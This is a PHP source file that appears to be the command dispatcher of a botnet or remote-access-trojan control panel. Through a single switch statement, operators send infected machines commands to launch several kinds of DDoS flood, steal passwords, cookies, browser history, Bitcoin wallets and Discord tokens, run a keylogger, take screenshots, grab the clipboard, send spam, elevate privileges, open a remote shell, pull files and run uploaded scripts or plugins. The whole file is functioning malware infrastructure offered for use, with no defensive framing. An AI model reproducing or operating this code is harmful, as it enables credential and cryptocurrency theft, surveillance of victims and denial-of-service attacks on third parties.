<?php
if ($_SESSION['csrf'] != $utils->sanitize($_POST['csrf'])) {
    $utils->show_alert("CSRF Token is invalid.", "danger", "times-circle");
    die();
}

$utils->show_input("csrf", $utils->sanitize($_POST['csrf']));

$client = new Clients;
if (isset($_POST['client'])) {
    $clientHWD = isset($_POST['client']) ? json_encode($_POST['client']) : null;
} elseif (isset($_POST['clients'])) {
    $clientHWD = $_POST['clients'];
} else {
    $utils->show_alert("You did not select a client to execute this command Please go back and choose a client.", "danger", "times-circle");
    die();
}

$command = isset($_POST['command']) ? $utils->sanitize($_POST['command']) : "nocommand";

$utils->show_input("command", $command);

$utils->show_input("clients", $clientHWD);

$Y = DATA_SPLITTER;

switch ($command) {
    case "nocommand":
        $utils->show_alert("You did not select a command to execute on the target deveice Please go back and choose a command.", "danger", "times-circle");
        break;

    case "uninstall":
        Send($clientHWD, "Uninstall");
        $utils->show_alert("Client Has Been Removed", "success", "check-circle");
        break;

    case "ddosw":

        if (isset($_POST['Form2'])) {
            switch ($utils->sanitize($_POST['attacktype'])) {
                case 'UDP Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "UDPAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                case 'TCP Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "TCPAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout'] . $Y . $_POST['port']));
                    break;

                case 'ARME Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "ARMEAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                case 'Slowloris Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "SlowlorisAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                case 'PostHTTP Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "PostHTTPAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                case 'HTTPGet Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "HTTPGetAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                case 'BandwidthFlood Attack':
                    Send($clientHWD, "StartDDOS" . $Y . "BWFloodAttack" . $Y . $utils->sanitize($_POST['TargetURL'] . $Y . $_POST['thread'] . $Y . $_POST['timeout']));
                    break;

                default:
                    $utils->show_alert("Attack Type does not exist !", "danger", "times-circle");
                    break;
            }

            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("ddos_attack");
        break;

    case 'stopddos':
        if (isset($_POST['Form2'])) {
            switch ($utils->sanitize($_POST['attacktype'])) {
                case 'UDP Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "UDPAttack");
                    break;

                case 'TCP Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "TCPAttack");
                    break;

                case 'ARME Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "ARMEAttack");
                    break;

                case 'Slowloris Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "SlowlorisAttack");
                    break;

                case 'PostHTTP Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "PostHTTPAttack");
                    break;

                case 'HTTPGet Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "HTTPGetAttack");
                    break;

                case 'BandwidthFlood Attack':
                    Send($clientHWD, "StopDDOS" . $Y . "BWFloodAttack");
                    break;

                default:
                    $utils->show_alert("Attack Type does not exist !", "danger", "times-circle");
                    break;
            }

            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("stop_ddos");
        break;

    case "uploadf":

        if (isset($_POST['Form2'])) {
            Send($clientHWD, "UploadFile" . $Y . $utils->sanitize($_POST['FileURL']) . $Y . $utils->sanitize($_POST['Name']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("upload");
        break;

    case "uploadfd":
        if (isset($_POST['Form2'])) {
            $upload_file = new BlackUpload\Upload($_FILES['file'], [
                "folder_name" => "upload",
                "folder_path" => realpath(APP_PATH . "upload/"),
            ], "classes/blackupload/");

            $upload_file->enableProtection();

            if ($upload_file->checkForbidden() &&
                $upload_file->checkExtension() &&
                $upload_file->checkMime()) {
                if ($upload_file->upload()) {
                    Send($clientHWD, "UploadFile" . $Y . $upload_file->generateDirectDownloadLink()
                        . $Y . $upload_file->getName());
                    $utils->show_alert("Command Has Been Send", "success", "check-circle");
                }
            } else {
                $json = $upload_file->getLogs();
                $utils->show_alert($upload_file->getMessage($json[0]['message']), "danger", "times-circle");
            }
        }
        menu("upload_file");
        break;

    case "ping":
        Send($clientHWD, "Ping");
        $utils->show_alert("Command Has Been Send", "success", "times-circle");
        break;

    case "msgbox":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "ShowMessageBox" . $Y . $utils->sanitize($_POST['Content']) . $Y . $utils->sanitize($_POST['MessageTitle']) . $Y . $utils->sanitize($_POST['msgicon']) . $Y . $utils->sanitize($_POST['msgbutton']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("messagebox");
        break;

    case "openwp":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "OpenPage" . $Y . $utils->sanitize($_POST['Weburl']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("openpage");

        break;

    case "openhidden":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "OpenHidden" . $Y . $utils->sanitize($_POST['Weburl']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("openpage");
        break;

    case "sendemail":
        if (isset($_POST['Form2'])) {
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
            Send($clientHWD, "SpamEmail" . $Y .
                $utils->sanitize($_POST['Host']) . $Y .
                $utils->sanitize($_POST['Port']) . $Y .
                $utils->sanitize($_POST['Username']) . $Y .
                $utils->base64_encode_url($utils->sanitize($_POST['Password'])) . $Y .
                str_replace(array("\r", "\n"), array(null, ','), $utils->sanitize($_POST['EmailList'])) . $Y .
                $utils->sanitize($_POST['Subject']) . $Y . str_replace("\n", "<br />", $utils->sanitize($_POST['Content'])));
        }
        menu("sendemail");
        break;

    case "stealhistory":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealHistory");
        break;

    case "close":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        $client->updateStatus($clientHWD, "Offline");
        Send($clientHWD, 'Close');
        break;

    case "moveclient":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "MoveClient" . $Y . $utils->sanitize($_POST['newHost']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("move_bot");
        break;

    case "invokecustom":
        if (isset($_POST['Form2'])) {
            $hasOutput = isset($_POST['hasoutput']) ? "True" : "False";

            $upload_file = new BlackUpload\Upload($_FILES['PluginFile'], [
                "folder_name" => "plugins",
                "folder_path" => realpath(APP_PATH . "plugins/"),
            ], "classes/blackupload/");

            $upload_file->enableProtection();
            if ($upload_file->checkForbidden() &&
                $upload_file->checkExtension() &&
                $upload_file->checkMime()) {
                if ($upload_file->upload()) {
                    Send($clientHWD, "InvokeCustom" . $Y . $upload_file->getName()
                        . $Y . $utils->sanitize($_POST['ClassName']) . $Y . $utils->sanitize($_POST['MethodName']) . $Y . $hasOutput . $Y . $utils->sanitize($_POST['outputType']));
                    $utils->show_alert("Command Has Been Send", "success", "check-circle");
                }
            } else {
                $json = $upload_file->getLogs();
                $utils->show_alert($upload_file->getMessage($json[0]['message']), "danger", "times-circle");
            }
        }
        menu("run_custom");
        break;

    case "getfile":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "GetFile" . $Y . $utils->sanitize($_POST['FilePath']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("get_file");
        break;

    case "blacklist":
        $utils->show_alert("Client Has Been Blocked", "success", "check-circle");
        Send($clientHWD, 'Blacklist');
        break;

    case 'tkschot':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Screenshot');
        break;

    case 'stealcookie':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StealCookie');
        break;

    case 'stealchcookie':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StealChCookies');
        break;

    case 'stealps':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'InstalledSoftwares');
        break;

    case 'startkl':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StartKeylogger');
        break;

    case 'stopkl':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'StopKeylogger');
        break;

    case 'getlogs':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'RetriveLogs');
        break;

    case 'stealpassword':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealPassword");
        break;

    case "stealbtc":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealBitcoin");
        break;

    case "stealdiscord":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "StealDiscord");
        break;

    case "getclipboard":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "GetClipboard");
        break;

    case "tempclean":
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, "CleanTemp");
        break;

    case 'exec':
        if (isset($_POST['Form2'])) {
            $file_name = $utils->sanitize($_POST['file_name']);
            $data = $_POST['data'];
            $req = new POST;
            $req->prepare(realpath("scripts/"), $file_name, $data);
            if ($req->write() == true) {
                Send($clientHWD, "ExecuteScript" . $Y . $utils->sanitize($_POST['scriptType']) . $Y . $utils->sanitize($_POST['file_name']));
                $utils->show_alert("Command Has Been Send", "success", "check-circle");
            }
        }
        menu("execute");
        break;

    case "update":
        if (isset($_POST['Form2'])) {
            $upload_file = new BlackUpload\Upload($_FILES['file'], [
                "folder_name" => "upload",
                "folder_path" => realpath(APP_PATH . "upload/"),
            ], "classes/blackupload/");

            $upload_file->enableProtection();

            if ($upload_file->checkForbidden() &&
                $upload_file->checkExtension() &&
                $upload_file->checkMime()) {
                if ($upload_file->upload()) {
                    Send($clientHWD, "UpdateClient" . $Y . $upload_file->generateDirectDownloadLink() . $Y . $upload_file->getName());
                    $utils->show_alert("Command Has Been Send", "success", "check-circle");
                }
            } else {
                $json = $upload_file->getLogs();
                $utils->show_alert($upload_file->getMessage($json[0]['message']), "danger", "times-circle");
            }
        }
        menu("update");
        break;

    case 'logoff':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Logoff');
        break;

    case 'restart':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Restart');
        break;

    case 'shutdown':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Shutdown');
        break;

    case 'elev':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Elevate');
        break;

    case 'restart':
        $utils->show_alert("Command Has Been Send", "success", "check-circle");
        Send($clientHWD, 'Restart');
        break;

    case "rshell":
        if (isset($_POST['Form2'])) {
            Send($clientHWD, "RemoteShell" . $Y . $utils->sanitize($_POST['shellprovider']) . $Y . $utils->sanitize($_POST['shellcommand']));
            $utils->show_alert("Command Has Been Send", "success", "check-circle");
        }
        menu("rshell");
        break;
    default:
        $utils->show_alert("Incorrect Command !!", "danger", "times-circle");
        break;
}

function Send($USER, $Command)
{
    try {
        $client = new Clients;
        $utils = new Utils;
        foreach (json_decode($USER) as $clientID) {
            $client->updateCommands($utils->sanitize($clientID), $utils->base64_encode_url($Command));
        }
    } catch (Exception $e) {
        die($e->getMessage());
    }
}

function menu($menu_name)
{
    $utils = new Utils;
    include_once "menus/" . $utils->sanitize($menu_name) . ".html";
}
